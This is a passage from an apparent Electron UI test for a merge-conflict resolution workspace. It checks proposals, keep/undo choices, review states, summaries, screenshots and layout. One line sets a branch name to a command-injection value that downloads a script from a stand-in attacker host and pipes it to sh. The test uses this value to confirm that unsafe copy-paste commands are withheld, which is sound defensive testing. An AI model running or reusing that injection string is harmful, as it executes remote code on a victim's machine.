      await js("[...document.querySelectorAll('.conflict-files button small')].map(s=>s.textContent)"),
      ['Proposal ready', '1 to decide']
    );
    const whole = "document.querySelector('.conflict-whole-file')";
    assert.equal(await js(`${whole}.dataset.bucket`), 'check');
    await wait(`${whole}.querySelector('p').textContent.startsWith('Mergiraf moved')`);
    assert.equal(
      await js<string>(`${whole}.querySelector('p').textContent`),
      'Mergiraf moved lines outside the conflict. The result parses and keeps every change from both sides. Read it, then use it.'
    );
    assert.equal(await js(`!!${block(0)}`), false, 'The conflicts wait behind the proposal');
    assert.equal(await js("!!document.querySelector('[data-bucket=merged]')"), false, 'Never Merged');
    assert.equal(await js(`${whole}.querySelector('.conflict-block-header').textContent`), 'Whole fileCheck');
    // The footer speaks of the proposal, and using it is the next step.
    assert.equal(await primary(), 'use-proposal');
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^1 proposal to check · 0 of 2 files reviewed$/
    );
    // While the conflicts are hidden, the proposal is the file's one stop for J and K.
    await wait("document.activeElement?.closest('.conflict-block')?.dataset.conflictIndex==='-1'");
    await key('j');
    assert.equal(await activeBlock(), '-1');
    await captureAll('whole-file-check');
    // The link shows the conflicts below the proposal; J and K then visit both.
    await click('Resolve conflict by conflict instead (1)');
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await js(`!!${whole}`), true);
    assert.equal(await primary(), 'next-conflict');
    // The proposal still covers the conflicts: the footer says what the header and the file list say.
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^1 proposal to check · 0 of 2 files reviewed$/
    );
    await js(`${whole}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '0');
    await key('k');
    assert.equal(await activeBlock(), '-1');
    await captureAll('whole-file-conflicts-shown');
    // 1, 2 and 3 never choose for a conflict while the proposal has focus.
    await key('1');
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    // Once you choose a conflict yourself, the proposal steps aside; Reset file brings it back.
    await key('j');
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.equal(await js(`!!${whole}`), false, 'Use this result would replace your choice');
    await click('Reset file');
    await wait(`!!${whole}`);
    await click('Use this result');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='whole-file'&&r.path==='lab/reorder.go')");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(await js("!!document.querySelector('.conflict-whole-file')"), false);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'Using it does not review it');
    // Now, and only now, it waits for Mark reviewed: the header and the file list say so together.
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-file-title [data-status], .conflict-files button:first-child [data-status]')].map(b=>b.textContent)"),
      ['Resolved · needs review', 'Resolved · needs review']
    );
    await captureAll('whole-file-used');
    // Reset file brings the whole-file proposal back, and the footer drops the suggestion's note.
    await click('Reset file');
    await wait(`!!${whole}`);
    assert.equal(await js("document.querySelector('.conflict-file-title [data-status]').textContent"), 'Proposal ready');
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^1 proposal to check · 0 of 2 files reviewed$/
    );
    await click('Use this result');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await click('Mark reviewed & next file');
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path==='lab/reorder.go')");
    assert.equal(
      await js("window.conflictCalls.find(r=>r.kind==='save'&&r.resolved&&r.path==='lab/reorder.go').contents"),
      reorder.wholeFile.text
    );
    // The other file says why structural merge proposed nothing.
    await wait(`${block(0)}?.querySelector('.conflict-block-note')?.textContent==='Structural merge timed out.'`);
    await captureAll('structural-note');
    // Only on the draft as prepared: a choice of yours hides it, so it can never replace your choices.
    await js(`${block(0)}.focus()`);
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.equal(await exists('Try structural merge again'), false);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Try structural merge again');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='mergiraf'&&r.path==='src/limits.ts')");
    assert.equal(await publishes(), 0);
    await click('Close');

    // A move rule's proposal (lib/conflict-moved.ts): the PR moved orderTotal and main edited it. "Use this result"
    // takes its text as it is: structural merge does not run. Structural merge timed out on this file, and "Try
    // structural merge again" stays beside the proposal.
    const movedCase = path.resolve('tests/fixtures/conflicts/ts-move-vs-edit-bottom');
    const side = (name: string) => fs.readFileSync(path.join(movedCase, name, 'src/pricing.ts'), 'utf8');
    const [mBase, mOurs, mTheirs, mResolved] = ['base', 'ours', 'theirs', 'resolved'].map(side);
    const mOriginal = (() => {
      const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'gnosis-moved-'));
      const names = ['ours', 'base', 'theirs'].map((n) => path.join(tmp, n));
      names.forEach((n, i) => fs.writeFileSync(n, [mOurs, mBase, mTheirs][i]));
      try {
        return execFileSync('git', ['merge-file', '-p', '--diff3', ...names]).toString();
      } catch (error) {
        return (error as { stdout: Buffer }).stdout.toString();
      } finally {
        fs.rmSync(tmp, { recursive: true, force: true });
      }
    })();
    assert.match(mOriginal, /^<<<<<<< /m);
    const movedFile = {
      path: 'src/pricing.ts',
      mode: '100644',
      base: mBase,
      ours: mOurs,
      theirs: mTheirs,
      original: mOriginal,
      result: mOriginal,
      wholeFile: { source: 'moved', text: mResolved, note: 'The PR moved orderTotal, and main edited it.' },
      structuralNote: 'Structural merge timed out.',
      resolved: false,
      source: 'manual',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([movedFile])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${whole}?.querySelector('p')?.textContent.startsWith('The PR moved orderTotal, and main edited it.')`);
    assert.match(
      await js<string>(`${whole}.querySelector('p').textContent`),
      /Gnosis applied the edit at the new place\. .*Call sites in other files were not checked\./
    );
    assert.equal(await js(`${whole}.dataset.bucket`), 'check');
    assert.equal(await js("!!document.querySelector('[data-bucket=merged]')"), false, 'Never Merged');
    assert.equal(await exists('Try structural merge again'), true, 'The timed-out structural merge can run again');
    assert.equal(await primary(), 'use-proposal');
    await click('Use this result');
    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='whole-file'&&r.path==='src/pricing.ts')");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(
      await js("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='mergiraf')"),
      false,
      'Using a moved proposal runs no structural merge'
    );
    assert.equal(await js('window.conflictFixture.files[0].result'), mResolved);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'Using it does not review it');
    assert.equal(await publishes(), 0);
    await click('Close');

    // Review shots: with GNOSIS_CONFLICT_SHOTS set, print `CONFLICTSHOT <name> <base64 PNG>` for the states below.
    const shot = async (name: string, dark = false) => {
      if (!process.env.GNOSIS_CONFLICT_SHOTS) return;
      await js('document.fonts.ready');
      await new Promise((r) => setTimeout(r, 300));
      const print = async (suffix: string) =>
        console.log(`CONFLICTSHOT ${name}${suffix} ${(await win.webContents.capturePage()).toPNG().toString('base64')}`);
      await print('');
      if (!dark) return;
      await js("document.documentElement.classList.add('dark')");
      await print('-dark');
      await js("document.documentElement.classList.remove('dark')");
    };
    const pick = (index: number, choice: string) =>
      js(`${block(index)}.querySelector('[data-choice=${choice}]').click()`);
    // Keep on a Check block whose proposal is that same text; the Check label beside its note.
    const keep = {
      path: 'src/Lab.Caching/Providers/Async/AsyncGenericCacheProvider.ts',
      base: `import { a } from './a';\n\nexport function one() {\n  return 1;\n}\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\nexport function one() {\n  return 10;\n}\n\n${three}${two}`,
      theirs: `import { a } from './a';\nimport { c } from './c';\n\nexport function one() {\n  return 11;\n}\n\n${four}${two}`,
      original: `import { a } from './a';\n<<<<<<< feature/retry\nimport { b } from './b';\n||||||| ancestor\n=======\nimport { c } from './c';\n>>>>>>> main\n\nexport function one() {\n  return 10;\n}\n\n<<<<<<< feature/retry\n${three}||||||| ancestor\n=======\n${four}>>>>>>> main\n${two}`,
      proposals: [{ source: 'mergiraf', text: "import { b } from './b';\nimport { c } from './c';\n" }, { source: 'mergiraf', text: three }],
      source: 'mergiraf',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,baseRepo:'lab/file-delete-vs-modify',files:${JSON.stringify([keep, imports, late].map((f) => withResult({ proposals: [], ...f })))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${block(1)}?.dataset.bucket==='check'`);
    await checksDone();
    // A neutral Check label: why to check it is the note beside it.
    assert.match(
      await js<string>(`${block(1)}.querySelector('.conflict-block-header').textContent`),
      /^Conflict 2 of 2Checkexport function four\(\) \{ from main is missing from the result\./
    );
    // Paths break only at "/": one line, the folders cut with an ellipsis, the file name whole.
    const listPath = "document.querySelector('.conflict-files button .conflict-path')";
    assert.equal(await js(`${listPath}.querySelector('.conflict-path-name').textContent`), 'AsyncGenericCacheProvider.ts');
    assert.ok(
      await js<boolean>(
        `(()=>{const [d,n]=[...${listPath}.children];const r=[d,n].map(e=>e.getBoundingClientRect());return r[1].top>=r[0].bottom-0.5&&n.scrollWidth<=n.clientWidth&&getComputedStyle(d).textOverflow==='ellipsis'})()`
      ),
      'A long path breaks after its folders, and the file name is whole'
    );
    assert.ok(
      await js<boolean>(
        "document.querySelector('.conflict-files button:nth-child(2) .conflict-path').getBoundingClientRect().height<24"
      ),
      'A short path stays on one line'
    );
    // The repository badge in the heading shows its whole name when it has room.
    assert.ok(
      await js<boolean>(
        "[...document.querySelectorAll('.conflict-heading .entity-badge-value > *')].every(e=>e.scrollWidth<=e.clientWidth)"
      ),
      'The repository badge is not clipped'
    );
    await shot('p1-keep-check', true);
    await js('document.querySelector(".conflict-suggest-trigger")?.click()');
    await wait("document.querySelector('.conflict-suggest-form textarea')");
    await shot('p1-suggest-menu');
    await key('Escape');
    // Keep PR change on a Check block whose proposal is the PR side: your choice, Decided.
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(1)}.querySelector('.conflict-kept').textContent`), /^Kept PR change/);
    await shot('p1-keep-ours');
    // Each conflict has its own check result: both sides added an import at one place, which is Check since #476, with
    // its own reason beside the conflict that lost four().
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`), /Both sides changed the same lines\./);
    assert.equal(await js(`${block(0)}.dataset.state`), 'proposal');
    // Keep both on one whose proposal is both sides: Kept both, never back to the proposal.
    await pick(0, 'both');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    assert.equal(await js("document.querySelector('.conflict-file-title [data-status]').textContent"), 'Resolved · needs review');
    await shot('p1-keep-both', true);
    // Undo returns the block to its proposal.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await pick(0, 'both');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    // Both Keeps equal their proposals. Saved with the draft, they still read as yours after Close and a reopen, never
    // as Merged; and a new Keep after the reopen keeps the earlier one.
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    const keepFile = `[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span[title]')?.getAttribute('title')===${JSON.stringify(keep.path)})`;
    await wait(`!!(${keepFile})`);
    await js(`(${keepFile}).click()`);
    await wait(`${block(0)}?.dataset.state==='kept' && ${block(1)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    assert.match(await js<string>(`${block(1)}.querySelector('.conflict-kept').textContent`), /^Kept PR change/);
    await js(`[...${block(1)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(1)}?.dataset.state!=='kept'`);
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.equal(await js(`${block(0)}.dataset.state`), 'kept', 'A new Keep never erases the saved one');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    // A file whose every conflict is Merged: Mark reviewed is the next step, and it has focus.
    await js("[...document.querySelectorAll('.conflict-files button')][1].click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.match(await js<string>("document.querySelector('.conflict-footer-status').textContent"), /^1 merged in this file · 0 of 3 files reviewed$/);
    await shot('p1-all-merged', true);
    await key('j');
    assert.equal(await js('document.activeElement?.dataset.conflictPrimary'), 'mark-reviewed');
    await shot('p1-all-merged-j');
    // Undo, then Keep both on a Merged conflict: Kept both, not Merged again.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await key('3');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /^Kept both changes/);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Use the proposal');
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    // The header keeps its layout whether "Start from Git's conflict" shows or not: the title and the view switch stay
    // put. Only a narrow tools row may wrap below them.
    await js('document.querySelector(".conflict-workspace").style.width="900px"');
    const header = () =>
      js<number[]>(
        "(()=>{const h=document.querySelector('.conflict-file-header').getBoundingClientRect();const t=document.querySelector('.conflict-file-title').getBoundingClientRect();const m=document.querySelector('.conflict-modes').getBoundingClientRect();return [t.top-h.top,t.height,m.top-h.top]})()"
      );
    const withProposals = await header();
    await shot('p1-header-proposals-900');
    await js("[...document.querySelectorAll('.conflict-files button')][2].click()");
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await exists('Start from Git’s conflict'), false);
    assert.deepEqual(await header(), withProposals, 'The file header does not jump');
    await shot('p1-header-plain-900');
    await js('document.querySelector(".conflict-workspace").style.width=""');
    await shot('p1-header-plain');
    await click('Close');
    // Only a Merged file is left: the summary, the header, the footer and the primary action agree.
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(imports)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='1 file has conflicts. 1 of 1 conflict is merged and checked. 1 file is ready for review.'"
    );
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    // Focus is on Mark reviewed only when the file opened with nothing to do, or after J; never moved there by a check.
    if (!(await js('document.activeElement?.dataset.conflictPrimary'))) await key('j');
    assert.equal(await js('document.activeElement?.dataset.conflictPrimary'), 'mark-reviewed');
    await shot('p1-only-merged', true);
    await key('m');
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)");
    await wait("document.querySelector('.conflict-confirm .step-card')");
    await click('Close');
    // A choice of yours beside a Merged conflict: never all-Merged. The result is shown before Mark reviewed, and the
    // summary says the file waits for review with the setting on or off.
    // Each side inserts at its own place in both conflicts (before and after a line both kept), so both are Merged.
    const twoMerged = {
      path: 'src/two.ts',
      base: `import { a } from './a';\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\n${three}${two}`,
      theirs: `import { c } from './c';\nimport { a } from './a';\n\n${two}\n${four}`,
      original: `${imports.original.replace(`\n${two}`, '')}\n<<<<<<< feature/retry\n${three}${two}||||||| ancestor\n${two}=======\n${two}\n${four}>>>>>>> main\n`,
      proposals: [imports.proposals[0], { source: 'mergiraf', text: `${three}${two}\n${four}` }],
      source: 'mergiraf',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(twoMerged)])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(`${block(1)}?.dataset.bucket==='merged'`);
    await js(`[...${block(1)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(1)}?.dataset.state==='open'`);
    await pick(1, 'ours');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='review-result'");
    await wait("window.conflictCalls.some(r=>r.kind==='save'&&!r.resolved)");
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    const reviewSentence = '1 file has conflicts. 1 of 2 conflicts are merged and checked. 1 file is ready for review.';
    // The save re-runs the checks (the draft is in the check key), so the summary reads "Checking…" until they finish.
    await checksDone();
    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
    await key('m');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'M shows the result first');
    // Setting off: the file is not reviewed for you, and the summary still says it waits for your review.
    const showMergedBox = "[...document.querySelectorAll('.conflict-summary label')].find(l=>l.textContent.includes('Show me every merged conflict'))?.querySelector('input')";
    await js(`${showMergedBox}.click()`);
    await wait(`!${showMergedBox}.checked`);
    await checksDone();
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'Not reviewed for you');
    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
    await js(`${showMergedBox}.click()`);
    await wait(`${showMergedBox}.checked`);
    await click('Close');
    // Rename/rename: every file needs a local merge tool, says so in the header too, and says what to do.
    const unsupported = (p: string) => ({ path: p, mode: '', base: '', ours: '', theirs: '', original: '', result: '', resolved: false, source: 'manual', unsupported: 'This conflict needs a local merge tool (rename, deletion, or repository structure).' });
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify(['src/left.ts', 'src/old.ts', 'src/right.ts'].map(unsupported))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait('document.querySelector("[data-conflict-local]")');
    assert.equal(
      await js("document.querySelector('[data-conflict-summary]').textContent"),
      '3 files have conflicts. 3 files need a local merge tool.'
    );
    assert.deepEqual(await badges('.conflict-file-title'), await listBadge(0), 'The header and the file list agree');
    assert.equal(await js("document.querySelector('.conflict-file-title [data-status]').textContent"), 'Needs a local merge tool');
    assert.match(
      await js<string>("document.querySelector('[data-conflict-local] pre').textContent"),
      /^git switch 'feature\/retry'\ngit pull\ngit fetch 'https:\/\/github\.com\/lab\/file-delete-vs-modify\.git' 'main'\ngit merge FETCH_HEAD$/
    );
    assert.ok(await exists('Copy commands'));
    await shot('p1-unsupported', true);
    await click('Close');
    await js("window.conflictFixture.headBranch='fix$(curl -s https://evil.example/x|sh)'");
    await open();
    await wait('document.querySelector("[data-conflict-local-unsafe]")');
    assert.equal(await js('!!document.querySelector("[data-conflict-local] pre")'), false, 'No commands to paste');
    assert.equal(await exists('Copy commands'), false);
    await shot('p1-unsupported-unsafe');
    await click('Close');
    await js("window.conflictFixture.headBranch='feature/retry'");
    // The confirmation with a long diff: the title and Push stay in view; the body scrolls.
    const long = Array.from({ length: 160 }, (_, i) => `export const value${i} = ${i};`);
    const confirmPatch = `diff --git a/src/retry.ts b/src/retry.ts\n--- a/src/retry.ts\n+++ b/src/retry.ts\n@@ -1,160 +1,160 @@\n${long.map((l) => `-${l}\n+${l.replace(';', ' + 1;')}`).join('\n')}\n`;
    await js(`(()=>{
      window.conflictPreview=${JSON.stringify(parsePatchFiles(confirmPatch).flatMap((p) => p.files))};
      Object.assign(window.conflictFixture,{version:1,baseRepo:'klang/engine',files:[{path:'src/retry.ts',mode:'100644',base:'a\\n',ours:'b\\n',theirs:'c\\n',original:'<<<<<<< feature/retry\\nb\\n=======\\nc\\n>>>>>>> main\\n',result:'b\\nc\\n',resolved:true,source:'manual'}]});
      window.conflictCalls=[];
    })()`);
    await open();
    await click('Review and push…');
    await wait("document.activeElement?.classList.contains('step-card-body')");
    const inView = () =>
      js<boolean>(
        `(()=>{const d=document.querySelector('.conflict-confirm').getBoundingClientRect();const t=document.querySelector('.conflict-confirm .step-card-title').getBoundingClientRect();const p=(${visibleButton('Push merge commit')}).getBoundingClientRect();return t.top>=d.top-0.5&&p.bottom<=d.bottom+0.5})()`
      );
    assert.ok(await inView(), 'The title and Push are in view');
    await js("document.querySelector('.conflict-confirm .step-card-body').scrollTop=1e6");
    assert.ok(await inView(), 'They stay in view at the end of the diff');
    await shot('p1-confirm-long', true);
    await resize(760, 800);
    assert.ok(await inView(), 'And in a narrow window');
    await resize(1280, 900);
    await click('Close');
    console.log(
      'Conflict workspace passed: labelled versions, per-block undo, shortcuts, review before mark, one confirmation, outcome and failure copy, edge screens, stale guard, themes and narrow layout.'
    );
    app.exit(0);
  } catch (error) {
    console.error(error);
    await capture('test-failure');
    app.exit(1);
  }
});
